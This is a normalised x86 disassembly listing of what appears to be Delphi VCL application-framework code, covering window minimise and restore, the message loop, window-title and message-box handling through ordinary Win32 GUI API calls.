mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_469d8c
pop ecx
jmp r-xdata
call sub_43a9dc
call sub_43ab18
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d854
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_46a534
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_469c1c
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_46954c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_4507d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4507d8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_46a5e4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_46954c
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_4507d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_469c2c
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_4507d8
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_465258
mov eax [ ebx + 0x44 ]
call sub_467674
sub_46a6e4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_46a720
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403ff8
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404094
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_46a76c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a7ee
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
lea eax [ ebx + 0x8c ]
mov edx esi
call sub_403ff8
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46a720
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043b0
jne r-xdata
mov eax esi
call sub_404464
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowTextA
lea eax [ ebx + 0x8c ]
call sub_403fa4
jmp r-xdata
cmp [ ebx + 0x8c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a7f5
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_46a7fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_46a820
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_46a870
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_446e44
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4507d8
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_46a928
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_46b8a0
sub_46a95c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4507d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403450
test al al
jne r-xdata
sub_46a9c8
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_46a928
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46a820
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46a870
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46a7fc
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_46aa78
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_46a9c8
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46b348
sub_46aa9c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_41a5b0
mov eax 0x8
call sub_4027c4
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_41a474
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_46aaf8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41a5d0
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4027e4
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41a4c0
jmp r-xdata
sub_46ab8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_46abca
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_4507b4
mov [ esi + 0x44 ] edi
sub_46ac0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_46acea
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_46197c
call sub_408080
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46acf1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_465258
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_46acb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46aa78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_464160
mov eax [ ebp - 0x4 ]
call sub_46a534
jmp r-xdata
sub_46ad0c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402854
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_402874
push eax
call sub_402854
pop edx
call sub_40bb54
call sub_402854
mov edx [ rw-data ]
call sub_4033e0
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_402854
mov edx eax
mov eax ebx
call sub_46af04
pop esi
pop ebx
retn
call sub_402854
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_46ad9c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_461a04
mov [ ebp - 0x10 ] eax
call sub_461920
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_469c98
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_46aef1
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aef8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_461ab8
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_461928
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_46af04
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46afbf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_40403c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_46a720
mov eax [ ebp - 0x108 ]
call sub_404464
push eax
mov eax [ ebp - 0x4 ]
call sub_404464
mov edx eax
mov eax ebx
pop ecx
call sub_46ad9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46afc6
lea eax [ ebp - 0x108 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
call sub_408a04
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d5c
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b74
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40426c
sub_46afdc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_450974
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_450adc
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46b680
test al al
je r-xdata
call sub_4507d8
mov ebp eax
mov eax edi
call sub_4507d8
mov ebp eax
mov eax esi
call sub_46b680
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_46b144
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46b19c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46b680
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46becc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b1a3
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_46b1ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46b204
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46b680
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46becc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b20b
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_46b21c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403254
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_44a158
jmp r-xdata
sub_46b26c
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_468770
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4507d8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46875c
mov ebx eax
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov eax ebx
call sub_4507d8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_46b2d0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_448864
mov edi eax
call sub_447160
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_44b16c
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_44b16c
sub_46b348
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46b458
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46b2d0
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4692d8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4470c8
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_46b508
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_4036f4#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_46b8a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46b26c
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41fe24
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b45f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc8
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_46b468
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_468754
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_468740
movzx edx di
xor ecx ecx
call sub_44b16c
inc esi
dec ebx
jne r-xdata
sub_46b4a4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_46a518
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46a518
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_46b468
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_46b508
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4043b0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403ff8
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_443888
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_456ad8
xor eax eax
push ebp
push sub_46b58d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403254
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_46b59c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_46b5f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_468754
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_46b59c
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_468740
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_46b59c
pop ecx
jmp r-xdata
mov eax ebx
call sub_450adc
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_4507d8
push eax
call IsChild
test eax eax
jne r-xdata
sub_46b680
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405a08
call sub_42c4b4
mov eax ebx
pop esi
